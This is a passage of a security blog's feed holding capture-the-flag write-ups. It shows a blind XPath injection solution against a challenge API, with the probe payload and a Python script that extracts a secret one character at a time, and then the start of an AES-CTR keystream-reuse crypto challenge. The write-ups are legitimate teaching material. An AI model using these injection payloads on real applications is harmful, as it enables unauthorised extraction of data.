style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"message"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"This millitary staff member exists."</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">"failure"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"message"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"This millitary staff member doesn't exist."</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can now clearly see that we're faced with the challenge of XPATH injection, and we also know where it occurs.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="analysis">Analysis<a href="https://kblagoev.com/blog/e-tree-cyberapocalypse-2021-ctf#analysis" class="hash-link" aria-label="Direct link to Analysis" title="Direct link to Analysis">​</a></h3>
<p>To test this out, I built the following data for the request, which would return true if the <code>selfDestructCode</code> is to be found within the structure of our XML target.</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">{"search": f"x' or count(/selfDestructCode)=1 or 'x'='y"}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>And since this gave us the a true response, we can now start building a request to test for a flag. For that, we are going to use another boolean-returning function, namely <code>starts-with</code>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="solution">Solution<a href="https://kblagoev.com/blog/e-tree-cyberapocalypse-2021-ctf#solution" class="hash-link" aria-label="Direct link to Solution" title="Direct link to Solution">​</a></h3>
<p>Since this will be a blind XML injection, we are going to have to be guessing each following symbol in our flag one by one, from a list of printable characters. Thankfully, we know how our flag starts, so this shouldn't be too difficult logistically. But, we have to not forget, that according to the XML file we were supplied with, the flag is split into two parts.</p>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">selfDestructCode</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">CHTB{f4k3_fl4g</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">selfDestructCode</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">selfDestructCode</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">_f0r_t3st1ng}</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">selfDestructCode</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So let's write up the logic flow of our solution:</p>
<ol>
<li>We generate a list of printable characters to test for.</li>
<li>We start a loop, in which we test whether the flag starts with <code>CHTB{ + some_char</code>.</li>
<li>If it does, we add <code>some_char</code> to our known flag, and continue onto the next character</li>
<li>If we run through the whole list of printable characters, without finding a match, we assume we've found the end of the string.</li>
<li>We move onto the second part of the flag, but this time we have no knowledge of how it starts</li>
<li>Repeat the loop process, and terminate with the same condition as in <code>4.</code></li>
</ol>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> string</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'http://138.68.179.198:30435/api/search'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">listOfPrintable </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">list</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">string</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">printable</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">getFlagStartingWith</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    foundOneNew </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">False</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> char </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> listOfPrintable</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic"># have to assume the second part doesn't also start with a capital C</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> char </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'C'</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      flagAttempt </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> flag </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> char</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">"search"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f"x' or //staff[starts-with(selfDestructCode, '</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">flagAttempt</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">')] or 'x'='y"</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> json</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      check </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'"success"'</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> check </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> char</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        foundOneNew </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> foundOneNew </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">False</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token keyword" style="color:#00009f">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> flag</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">firstPartOfFlag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> getFlagStartingWith</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'CHTB{'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">secondPartOfFlag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> getFlagStartingWith</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">''</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> firstPartOfFlag </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> secondPartOfFlag</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>After a bit, this will spit our flag out</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<!-- -->
<!-- -->
<div class="alert alert--primary" role="alert"><div class="card__body"><p>Thank you for reading!</p><p>The information in this blog, as well as all the tools, apps and libraries I develop are currently open source.</p><p>I would love to keep it this way, and you can help!</p><p>You can buy me a coffee from here, which will go towards the next all-nighter I pull off!</p><a href="https://www.buymeacoffee.com/kblagoev" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-violet.png" class="bmac_qmhE" alt="Buy Me A Coffee"></a><p>Or you can support me and my code monthly over at <a href="https://github.com/sponsors/tihawk" target="_blank">Github Sponsors!</a></p><p>Thanks!</p></div></div>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Cyber Security" term="Cyber Security"/>
        <category label="CTF" term="CTF"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Phasestream 3 - Cyberapocalypse 2021 CTF]]></title>
        <id>https://kblagoev.com/blog/phasestream-3-cyberapocalypse-2021-ctf</id>
        <link href="https://kblagoev.com/blog/phasestream-3-cyberapocalypse-2021-ctf"/>
        <updated>2021-04-28T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[This is a writeup for the challenge Phasestream 3, part of the Hack the box's Cyberapocalypse CTF 2021, category Crypto.]]></summary>
        <content type="html"><![CDATA[<p>This is a writeup for the challenge Phasestream 3, part of the Hack the box's Cyberapocalypse CTF 2021, category Crypto.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="propmpt">Propmpt<a href="https://kblagoev.com/blog/phasestream-3-cyberapocalypse-2021-ctf#propmpt" class="hash-link" aria-label="Direct link to Propmpt" title="Direct link to Propmpt">​</a></h3>
<p>The aliens have learned the stupidity of their misunderstanding of Kerckhoffs's principle. Now they're going to use a well-known stream cipher (AES in CTR mode) with a strong key. And they'll happily give us poor humans the source because they're so confident it's secure!</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="recon">Recon<a href="https://kblagoev.com/blog/phasestream-3-cyberapocalypse-2021-ctf#recon" class="hash-link" aria-label="Direct link to Recon" title="Direct link to Recon">​</a></h3>
<p>We are given the source code that the aliens used to encrypt the flag using "Advanced Encryption Standard" in "Counter" mode.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#@/usr/bin/env python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> Crypto</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Cipher </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> AES</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> Crypto</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Util </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> Counter</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> os</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">KEY </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> os</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">urandom</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">encrypt</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">plaintext</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cipher </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> AES</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">new</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">KEY</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> AES</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">MODE_CTR</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> counter</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">Counter</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">new</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">128</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ciphertext </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> cipher</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encrypt</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">plaintext</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> ciphertext</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">hex</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b"No right of private conversation was enumerated in the Constitution. I don't suppose it occurred to anyone at the time that it could be prevented."</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">encrypt</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">test</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'flag.txt'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'rb'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">strip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">encrypt</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>By looking at the code, we don't see any immediate weaknesses like generating random numbers with a known seed for example.</p>
<p>We also have the output of running this code.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> output.txt </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">464851522838603926f4422a4ca6d81b02f351b454e6f968a324fcc77da30cf979eec57c8675de3bb92f6c21730607066226780a8d4539fcf67f9f5589d150a6c7867140b5a63de2971dc209f480c270882194f288167ed910b64cf627ea6392456fa1b648afd0b239b59652baedc595d4f87634cf7ec4262f8c9581d7f56dc6f836cfe696518ce434ef4616431d4d1b361c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4b6f25623a2d3b3833a8405557e7e83257d360a054c2ea</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>And here we can notice something. The output consists of 2 separate lines. Could it be that we also have the output of encrypting the test string? Let's count the characters in the first line vs the test string.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin class-name">echo</span><span class="token plain"> 464851522838603926f4422a4ca6d81b02f351b454e6f968a324fcc77da30cf979eec57c8675de3bb92f6c21730607066226780a8d4539fcf67f9f5589d150a6c7867140b5a63de2971dc209f480c270882194f288167ed910b64cf627ea6392456fa1b648afd0b239b59652baedc595d4f87634cf7ec4262f8c9581d7f56dc6f836cfe696518ce434ef4616431d4d1b361c</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">wc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">293</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
